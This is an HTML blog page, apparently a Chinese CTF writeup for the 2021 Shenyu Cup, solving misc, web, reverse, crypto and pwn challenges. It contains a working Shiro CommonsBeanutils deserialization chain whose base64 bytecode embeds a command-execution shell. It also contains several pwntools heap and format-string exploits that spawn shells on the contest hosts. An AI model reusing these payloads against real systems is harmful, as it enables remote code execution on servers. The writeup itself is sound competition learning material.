@@ -1,0 +1,604 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2021年&#34;深育杯&#34;网络安全大赛Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2021年&#34;深育杯&#34;网络安全大赛Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Misc
+签到题
+下载附件得到一张二维码
+
+扫码关注，后台回复签到即可获得flag
+
+flag：
+SangFor{AaKjtQr_OjJpdA3QwBV_ndsKdn3vPgc_}
+
+Login
+下载附件example.zip，打开是pas..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2021年&#34;深育杯&#34;网络安全大赛Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-11-15
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="misc">Misc</h2>
+<h3 id="签到题">签到题</h3>
+<p>下载附件得到一张二维码</p>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/3a4acd932863e.png" alt="1636785858546.png" loading="lazy"></figure>
+<p>扫码关注，后台回复签到即可获得flag</p>
+<figure data-type="image" tabindex="2"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/215cabe1c32d0.png" alt="1636785941819.png" loading="lazy"></figure>
+<p>flag：</p>
+<pre><code>SangFor{AaKjtQr_OjJpdA3QwBV_ndsKdn3vPgc_}
+</code></pre>
+<h3 id="login">Login</h3>
+<p>下载附件example.zip，打开是password.zip</p>
+<figure data-type="image" tabindex="3"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/87e9086c161cb.png" alt="1636786617187.png" loading="lazy"></figure>
+<p>但是需要密码，尝试爆破</p>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/d346e9601506e.png" alt="1636786126543.png" loading="lazy"></figure>
+<p>此时发现了异常，打开明明只有一个password.zip文件，这里却检测到了两个加密文件，于是我们将压缩包用010 Editor打开分析一下</p>
+<figure data-type="image" tabindex="5"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/5dca17b64ffd0.png" alt="1636786353371.png" loading="lazy"></figure>
+<p>发现有伪加密，将此处以及后面一处的09改为00，保存之后再打开压缩包发现多了两个文件</p>
+<figure data-type="image" tabindex="6"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/106b03dd469eb.png" alt="1636786510411.png" loading="lazy"></figure>
+<p>其中<code>示例-副本.txt</code>能够打开，而<code>示例.txt</code>打开会提示需要输入密码</p>
+<p>打开副本发现这就是 题目说的那个发邮件即可获得账号</p>
+<figure data-type="image" tabindex="7"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/542f46f427481.png" alt="1636786764037.png" loading="lazy"></figure>
+<p>但是发了几次邮件始终没有等到回信，后来发现重点不在这儿，既然这两个示例txt是一样的，那我们就可以采用ZIP明文攻击，来爆破出这个zip的密码。将<code>示例-副本.txt</code>拖出来，打包成zip，我们可以发现这两个zip中的<code>示例-副本.txt</code>的CRC32值是一样的</p>
+<figure data-type="image" tabindex="8"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/813e5800a5638.png" alt="1636786929164.png" loading="lazy"></figure>
+<p>打开<code>ARCHPR</code>，将<code>example.zip</code>载入，然后载入<code>示例 - 副本.zip</code></p>
+<figure data-type="image" tabindex="9"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/8520a528885fe.png" alt="1636787398773.png" loading="lazy"></figure>
+<p>最终得到压缩包密码为：<code>qwe@123</code></p>
+<p>尝试打开password，但是发现数据错误，所以将刚刚的09改为00又重新复原为09</p>
+<figure data-type="image" tabindex="10"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/834a4da4b862d.png" alt="1636787448498.png" loading="lazy"></figure>
+<p>复原后，打开还是报错，最后才发现是我的7z出问题了，换用winrar成功用密码<code>qwe@123</code>打开password.zip</p>
+<figure data-type="image" tabindex="11"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/97ce6e90f523f.png" alt="1636787545918.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/b8158dd93248b.png" alt="1636787632398.png" loading="lazy"></figure>
+<p>打开之后，里面有一个<code>.password.swp</code>，swp文件是vi编辑器异常退出后留下的文件，使用指令：<code>vi -r .password.swp</code>即可恢复文件，但是需要密码，这里还有三个txt文件，只有6个字节大小，尝试爆破crc32</p>
+<p>脚本地址：<code>https://github.com/theonlypwner/crc32</code></p>
+<p>使用方法：<code>python crc32.py reverse crc32值</code>(crc32值前面注意要加0x)</p>
+<p>运行三次之后分别得到三段疑似密码的明文</p>
+<figure data-type="image" tabindex="13"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/2e03eecf88b0c.png" alt="1636787839757.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/3db3d68b68745.png" alt="1636787911702.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/a6479e937db42.png" alt="1636787961879.png" loading="lazy"></figure>
+<p>这三段组合起来就是<code>welc0me_sangforctf</code>，这应该就是密码了，成功解压<code>.password.swp</code>，将它移动到kali里，然后执行命令<code>vi -r .password.swp</code></p>
+<figure data-type="image" tabindex="16"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/66d809cbadb1c.png" alt="1636788254560.png" loading="lazy"></figure>
+<p>得到账号密码为：</p>
+<pre><code>Admin
+5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+<p>回到题目尝试登录发现禁止查看源码</p>
+<figure data-type="image" tabindex="17"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/0a24d86fdae34.png" alt="1636788356562.png" loading="lazy"></figure>
+<p>直接BurpSuite抓包，丢到重放器里面，发包即可看到回显，flag在注释里面</p>
+<figure data-type="image" tabindex="18"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/35c635e9bc5b8.png" alt="1636788405575.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>Sangfor{ef3d229c-0d10-4d99-a768-ff41a4d624e7}
+</code></pre>
+<h2 id="web">Web</h2>
+<h3 id="weblog">weblog</h3>
+<p>有个文件下载，访问?logname=cb-0.0.1-SNAPSHOT.jar下载到源码</p>
+<p>看pom</p>
+<figure data-type="image" tabindex="19"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/6400976e04aa2.png" alt="1636802545139.png" loading="lazy"></figure>
+<p>可以打cb1的shiro链子</p>
+<pre><code class="language-java">import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+public class CommonsBeanutilsShiro {
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+
+    public static void main(String[] args) throws Exception {
+//        TemplatesImpl obj = new TemplatesImpl();
+//        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{
+//                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
+//        });
+//        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+//        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        byte[] evilcode = Base64.getDecoder().decode(&quot;yv66vgAAADQAuQoALwBfCgBgAGEKAGAAYggAYwoAZABlCABmBwBnCgAHAGgHAGkKAGoAawgAbAgAbQgAbggAbwgATQoABwBwCABxCABOBwByCgBqAHMIAFAIAHQKAHUAdgoAEwB3CAB4CgATAHkIAHoIAHsKABMAfAgAfQgAfggAfwgAgAoACQCBCACCBwCDCgCEAIUKAIQAhgoAhwCICgAkAIkIAIoKACQAiwoAJACMCACNCACOBwCPBwCQAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMcm9tZS9TcHJpbmdFdmlsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwCRAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAFjAQARTGphdmEvbGFuZy9DbGFzczsBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFvAQASTGphdmEvbGFuZy9PYmplY3Q7AQACbTEBAARyZXNwAQADcmVxAQAJZ2V0V3JpdGVyAQAJZ2V0SGVhZGVyAQAGd3JpdGVyAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY29tbWFuZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALY2hhcnNldE5hbWUBAA1TdGFja01hcFRhYmxlBwCPBwBnBwCSBwBpBwByBwBTBwCTAQAKU291cmNlRmlsZQEAD1NwcmluZ0V2aWwuamF2YQwAQgBDBwCUDACVAJYMAJcAmAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAmQwAmgCbAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAJwAnQEAEGphdmEvbGFuZy9PYmplY3QHAJIMAJ4AnwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEACmdldFJlcXVlc3QBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQwAoACdAQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcMAKEAogEAB29zLm5hbWUHAKMMAKQApQwApgCnAQAGd2luZG93DACoAKkBAANHQksBAAVVVEYtOAwAqgCnAQADV0lOAQACL2MBAAcvYmluL3NoAQACLWMMAKsArAEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcArQwArgCvDACwALEHALIMALMAtAwAQgC1AQACXEEMALYAtwwAuACnAQAFZmx1c2gBAAVjbG9zZQEAD3JvbWUvU3ByaW5nRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAWADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAbADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAHAAEAB0AEAAeABsAHwAlACAAMQAhADwAIgBIACMAUwAkAF8AJQB1ACYAkAAnAJYAKACcACkAqQAqAL4AKwDEACwA3QAtAO0ALgDzAC8A/AAxAQIAMgEIADQBDgA1AUoANgFiADcBegA4ADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXg==&quot;);
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{evilcode});
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{obj, obj});
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+        byte[] expcode = Base64.getEncoder().encode(barr.toByteArray());
+        System.out.println(new String(expcode));
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/cbb9b881185aa.png" alt="1636803668905.png" loading="lazy"></figure>
+<h2 id="re">Re</h2>
+<h3 id="xor_exercise">XOR_Exercise</h3>
+<p>F5丢进去一看，典型的ollvm混淆(很多while)</p>
+<figure data-type="image" tabindex="21"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/15/165e5bc83f774.png" alt="1636936910069.png" loading="lazy"></figure>
+<pre><code>百度找到脚本deflat去除混淆,关键算法段如下
+while ( 1 )
+ {
+  v12 = v6;
+  flag = v6 &lt; 64;
+  while ( b &gt;= 10 &amp;&amp; ((((_BYTE)a - 1) * (_BYTE)a) &amp; 1) != 0 );
+  if ( !flag )
+   break;
+  do
+   v14 = v6;
+  while ( b&gt;= 10 &amp;&amp; ((((_BYTE)a - 1) * (_BYTE)a) &amp; 1) != 0 );
+  v15 = v9[v14];
+  if ( v15 == 10 )
+  {
+   do
+     v16 = v6;
+   while ( b&gt;= 10 &amp;&amp; ((((_BYTE)a - 1) * (_BYTE)a) &amp; 1) != 0 );
+   v17 = &amp;v9[v16];
+   if ( b&gt;= 10 &amp;&amp; ((((_BYTE)a- 1) * (_BYTE)a) &amp; 1) != 0 )
+     goto Error;
+   while ( 1 )
+   {
+     *v17 = 0;
+     if ( b &lt; 10 || ((((_BYTE)a- 1) * (_BYTE)a) &amp; 1) == 0 )
+      break;
+LABEL_42:
+     *v17 = 0;
+   }
+   goto LABEL_13;
+  }
+  v18 = v6;
+v19 = ++v6;
+
+
+
+
+脚本
+\#include &quot;stdafx.h&quot;
+int main(int argc, char* argv[])
+{
+      unsigned __int64 k=0xB1234B7679FC4B3D;
+      unsigned __int64 map[] = {0x32E9A65483CC9671,0x0EC92A986A4AF329C,0x96C8259BC2AC4673,0x74BF5DCA4423530F,0x59D78EF8FDCBFAB1,0xA65257E5B13942B1};
+      for(int i=0;i&lt;6;i++){
+          for(int j=0;j&lt;64;j++){
+              if(map[i]&amp;1){
+                   map[i]^=k;
+                   map[i]&gt;&gt;=1;
+                map[i]|=0x8000000000000000;
+              }else{
+                   map[i]&gt;&gt;=1;
+              }
+          }
+      }
+      for(int j=0;j&lt;6;j++){
+          printf(&quot;%8s&quot;,&amp;map[j]);
+     }
+     getchar();
+    return 0;
+}
+</code></pre>
+<h3 id="lithops">Lithops</h3>
+<p>这题有点像吾爱破解的某个cm，实质上就是考察字符集的转换，前面花里胡哨，不知道干啥，但是真正加密的地方就调用了一个api,就是ANSI-&gt;UTF8</p>
+<figure data-type="image" tabindex="22"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/107c2ba289819.jpg" alt="clip_image002.jpg" loading="lazy"></figure>
+<p>Dump出UTF8字符，直接脚本解密</p>
+<figure data-type="image" tabindex="23"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/0c6f19ab7801b.jpg" alt="clip_image004.jpg" loading="lazy"></figure>
+<p>易语言在某些方面还是方便的</p>
+<figure data-type="image" tabindex="24"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/7cdd6da62e4e4.jpg" alt="clip_image006.jpg" loading="lazy"></figure>
+<h2 id="cry">Cry</h2>
+<h3 id="gege">GeGe</h3>
+<p>原题，<code>https://blog.soreatu.com/posts/an-introduction-to-ntruencrypt-through-a-ctf-challenge/</code>这里贴个链接</p>
+<p>改了一点，用脚本跑</p>
+<figure data-type="image" tabindex="25"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/13/f0c4ee9a9677f.png" alt="image-20211113210707578.png" loading="lazy"></figure>
+<h2 id="pwn">Pwn</h2>
+<h3 id="find-flag">find-flag</h3>
+<p>漏洞点在printf 处，printf(format)存在格式化字符串漏洞</p>
+<p>在pwndbg中测试offset 偏移6+11为canary偏移  4+11为gadget偏移</p>
+<p>先格式化字符串泄露出canary和pie 然后直接gets溢出打后门函数</p>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+io = remote(&quot;192.168.41.86&quot;,&quot;2001&quot;)
+flag_offset = 0x1228
+
+io.recvuntil(&quot;?&quot;)
+io.sendline(b'%17$p%15$p')
+io.recvuntil(&quot;0x&quot;)
+canary = int(io.recv(16),16)
+io.recvuntil(&quot;0x&quot;)
+pie = int(io.recv(12),16) - 0x1140
+
+flag = pie + flag_offset
+payload2 = b'a'*0x38+p64(canary) + b'a'*8 + p64(flag)
+io.sendline(payload2)
+
+io.interactive()
+</code></pre>
+<h3 id="write_book">write_book</h3>
+<p>2.27libc - 1.14</p>
+<p>add delete edit show都存在</p>
+<p>漏洞点在edit中 存在offset by NULL漏洞</p>
+<p>直接 House Of Einherjar 打堆快重叠</p>
+<p>然后利用重叠的堆快show出main_arena + 96的地址得到libc</p>
+<p>最后利用堆块重叠打tcache attack</p>
+<p>一开始是打mallochook 为onegadet 加了realloc调栈仍然没有通</p>
+<p>最后直接打freehook为system 传入bin sh 参数 get shell</p>
+<pre><code class="language-python">from pwn import *
+
+libc  = ELF(&quot;./libc.so.6&quot;,checksec = 0)
+p = remote('192.168.41.86','2002')
+#p = process(&quot;./writebook&quot;)
+def Add(size):     
+        p.sendlineafter(&quot;&gt; &quot;,str(1))
+        p.sendlineafter(&quot;&gt; &quot;,str(1))
+        p.sendlineafter(&quot;size: &quot;,str(size))
+def Edit(page,content):
+        p.sendlineafter(&quot;&gt; &quot;,str(2))
+        p.sendlineafter(&quot;Page: &quot;,str(page))
+        p.sendlineafter(&quot;Content: &quot;,content)
+def Delete(page):
+        p.sendlineafter(&quot;&gt; &quot;,str(4))
+        p.sendlineafter(&quot;Page: &quot;,str(page))
+def Show(page):
+        p.sendlineafter(&quot;&gt; &quot;,str(3))
+        p.sendlineafter(&quot;Page: &quot;,str(page))
+
+for i in range(0,7):
+        Add(0xf0)
+Add(0xf0) 
+Add(0xf0) 
+Add(0xf0) 
+Add(0xf0) 
+Add(0x18) 
+Add(0xf0) 
+Add(0x18) 
+Edit(11,p64(0)*2 + p64(0x400 + 0x20))
+for i in range(0,7):
+       Delete(i)
+Delete(7)
+Delete(12)
+for i in range(0,7):
+        Add(0xf0)
+Add(0xf0)
+Show(8)
+main_arena = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+malloc_hook = main_arena - 96 - 0x10
+libc_base = malloc_hook - libc.sym[&quot;__malloc_hook&quot;]
+free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+system = libc_base + libc.sym[&quot;system&quot;]
+realloc =  libc_base + libc.sym[&quot;__libc_realloc&quot;]
+#setcontext =   libc_base + libc.sym[&quot;setcontext&quot;]
+one_gadget = [0x4f3d5,0x4f432,0x10a41c]
+
+Add(0xf0) 
+Add(0xf0) 
+Delete(14)
+Delete(12)
+#Edit(8,p64(malloc_hook-0x10))
+Edit(8,p64(free_hook-0x10))
+Add(0xf0) 
+Add(0xf0) 
+#attack malloc
+&quot;&quot;&quot;
+payload = p64(0)*2 + p64(realloc+0x10) + p64(one_gadget[1]+libc_base)
+Edit(14,payload)
+#gdb.attach(p)
+Add(0x18)
+p.interactive()
+&quot;&quot;&quot;
+
+#attack free_hook
+payload = p64(0)*2 + p64(system)
+Edit(14,payload)
+#gdb.attach(p)
+Edit(12,&quot;/bin/sh\x00&quot;)
+Delete(12)
+p.sendline(&quot;cat flag.txt&quot;)
+flag = p.recvuntil(&quot;}&quot;)
+print(flag)
+p.interactive()
+</code></pre>
+<h3 id="create_code">create_code</h3>
+<p>堆溢出，off-by-null打</p>
+<pre><code class="language-python">from pwn import *
+#p = process(&quot;./create_code&quot;)
+p = remote(&quot;192.168.41.86&quot;,2007)
+context.log_level = 'debug'
+libc = ELF(&quot;./libc.so.6&quot;)
+elf = ELF('./create_code')
+
+def choice(c):
+	p.recvuntil(&quot;&gt;&quot;)
+	p.sendline(str(c))
+
+def add(content):
+	choice(1)
+	p.recvuntil(&quot;:&quot;)
+	p.send(content)
+
+def show(id):
+	choice(2)
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(str(id))
+
+def free(id):
+	choice(3)
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(str(id))
+
+add(&quot;a&quot;) #0
+add(&quot;b&quot;) #1
+add(&quot;c&quot;) #2
+add(&quot;d&quot;) #3
+free(0) 
+add(&quot;a&quot;*0x320+p64(0)+p64(0x661))
+free(0)
+add('a'*0x320+ p64(0) + p64(0x331)+p64(0x414141414141))
+show(0)
+libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;)) - libc.sym[&quot;__malloc_hook&quot;] - 96 - 0x10
+success(&quot;libc_base:&quot;+hex(libc_base))
+free_hook = libc_base+libc.sym[&quot;__free_hook&quot;]
+system = libc_base+libc.sym[&quot;system&quot;]
+
+free(1)
+free(0)
+free(0)
+free(0)
+add(&quot;a&quot;*0x320+p64(0)+p64(0x331)+p64(free_hook-0x8))
+add(&quot;a&quot;*0x320+p64(0)+p64(0x331)+&quot;/bin/sh\x00&quot;)
+add(&quot;aaaa&quot;)
+add(p64(system)*2)
+free(0)
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
